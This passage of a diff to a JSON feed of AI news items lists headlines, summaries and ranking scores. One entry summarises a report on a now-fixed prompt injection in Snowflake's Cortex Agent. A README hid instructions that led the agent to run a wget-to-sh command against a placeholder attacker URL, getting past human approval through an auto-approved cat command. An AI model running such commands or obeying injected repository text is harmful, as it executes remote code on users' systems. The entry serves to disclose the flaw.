-      "published": "2026-03-18T18:05:16+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "low_editorial_priority",
-      "score": 1.6469
-    },
-    {
-      "title": "Why Walmart and OpenAI Are Shaking Up Their Agentic Shopping Deal",
-      "url": "https://www.wired.com/story/ai-lab-walmart-openai-shaking-up-agentic-shopping-deal",
-      "source": "Wired AI",
-      "sourceUrl": "https://www.wired.com/feed/tag/ai/latest/rss",
-      "sourceWeight": 0.85,
-      "category": "AI",
-      "summary": "After OpenAI’s Instant Checkout feature fell short, Walmart is instead embedding its Sparky chatbot directly into ChatGPT and Google Gemini.",
-      "image": "https://media.wired.com/photos/69b9c55f4318d2003e7286fe/master/pass/business_walmart_openai_shopping_chatbot.jpg",
-      "published": "2026-03-18T18:01:18+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": true,
-      "editorial_reason": "major_product_news",
-      "score": 15.4858
-    },
-    {
-      "title": "Patreon CEO calls AI companies’ fair use argument ‘bogus,’ says creators should be paid",
-      "url": "https://techcrunch.com/2026/03/18/patreon-ceo-calls-ai-companies-fair-use-argument-bogus-says-creators-should-be-paid",
-      "source": "TechCrunch AI",
-      "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
-      "sourceWeight": 0.85,
-      "category": "AI",
-      "summary": "Patreon CEO Jack Conte says AI companies should pay creators for training data, arguing their fair use defense falls apart when they license content from major publishers.",
-      "image": "https://techcrunch.com/wp-content/uploads/2026/03/jack-conte-sxsw-1.jpg?resize=1200%2C800",
-      "published": "2026-03-18T17:54:31+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "low_editorial_priority",
-      "score": 2.084
-    },
-    {
-      "title": "Snowflake Cortex AI Escapes Sandbox and Executes Malware",
-      "url": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai",
-      "source": "Simon Willison",
-      "sourceUrl": "https://simonwillison.net/atom/everything/",
-      "sourceWeight": 0.85,
-      "category": "AI",
-      "summary": "Snowflake Cortex AI Escapes Sandbox and Executes Malware\nPromptArmor report on a prompt injection attack chain in Snowflake's Cortex Agent, now fixed.\nThe attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.\nThe attack caused the agent to execute this code:\ncat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))\n\nCortex listed cat commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.\nI'",
-      "image": "",
-      "published": "2026-03-18T17:43:49+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "did_not_clear_gate",
-      "score": 4.581
-    },
-    {
-      "title": "Federal cyber experts called Microsoft's cloud a \"pile of shit,\" approved it anyway",
-      "url": "https://arstechnica.com/information-technology/2026/03/federal-cyber-experts-called-microsofts-cloud-a-pile-of-shit-approved-it-anyway",
-      "source": "Ars Technica (AI/Tech)",
-      "sourceUrl": "https://feeds.arstechnica.com/arstechnica/technology-lab",
-      "sourceWeight": 0.75,
-      "category": "AI",
-      "summary": "One Microsoft product was approved despite years of concerns about its security.",
-      "image": "https://cdn.arstechnica.net/wp-content/uploads/2025/09/microsoft-logo-1024x648.jpg",
-      "published": "2026-03-18T17:36:40+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "low_editorial_priority",
-      "score": 2.7391
-    },
-    {
-      "title": "Rebel Audio is a new AI podcasting tool aimed at first-time creators",
-      "url": "https://techcrunch.com/2026/03/18/rebel-audio-is-a-new-ai-podcasting-tool-aimed-at-first-time-creators",
-      "source": "TechCrunch AI",
-      "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
-      "sourceWeight": 0.85,
-      "category": "AI",
-      "summary": "Rebel Audio is a new all-in-one podcasting tool that allows creators to record podcasts, edit, clip content for social, and publish episodes, all without ever leaving the platform.",
-      "image": "https://techcrunch.com/wp-content/uploads/2021/12/GettyImages-1297183927.jpg?resize=1200%2C800",
-      "published": "2026-03-18T17:15:00+00:00",
-      "firstSeen": "2026-03-18T17:15:53.523938+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "low_editorial_priority",
-      "score": 1.7732
-    },
-    {
-      "title": "The Gemini-powered features in Google Workspace that are worth using",
-      "url": "https://techcrunch.com/2026/03/18/the-gemini-powered-features-in-google-workspace-that-are-worth-using",
-      "source": "TechCrunch AI",
-      "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
-      "sourceWeight": 0.85,
-      "category": "AI",
-      "summary": "From summarizing emails, drafting content, organizing data, and tracking meetings, here are all the best Gemini features in Google Workspace.",
-      "image": "https://techcrunch.com/wp-content/uploads/2025/08/GettyImages-2198713751.jpg?w=1024",
-      "published": "2026-03-18T16:43:18+00:00",
-      "firstSeen": "2026-03-18T17:00:01.477074+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": true,
-      "editorial_reason": "high_score_override",
-      "score": 7.7647
+      "score": 1.8365
     },
     {
       "title": "The Life Scientific: Jehane Ragai",
@@ -653,10 +653,10 @@
       "image": "https://ichef.bbci.co.uk/images/ic/1200x675/p0kxnch7.jpg",
       "published": "2026-03-16T21:00:00+00:00",
       "firstSeen": "2026-03-16T21:52:48.382497+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "framework_or_plumbing",
-      "score": -0.3394
+      "score": -0.3482
     },
     {
       "title": "The Life Scientific: Tony Juniper",
@@ -669,10 +669,10 @@
       "image": "https://ichef.bbci.co.uk/images/ic/1200x675/p0kxnch7.jpg",
       "published": "2026-03-09T21:00:00+00:00",
       "firstSeen": "2026-03-10T12:01:07.759785+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 1.1916
+      "score": 1.1915
     },
     {
       "title": "Introducing... Life Without",
@@ -685,7 +685,7 @@
       "image": "https://ichef.bbci.co.uk/images/ic/1200x675/p0n4svjb.jpg",
       "published": "2026-03-06T08:32:00+00:00",
       "firstSeen": "2026-03-07T19:58:50.259314+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
       "score": 2.2201
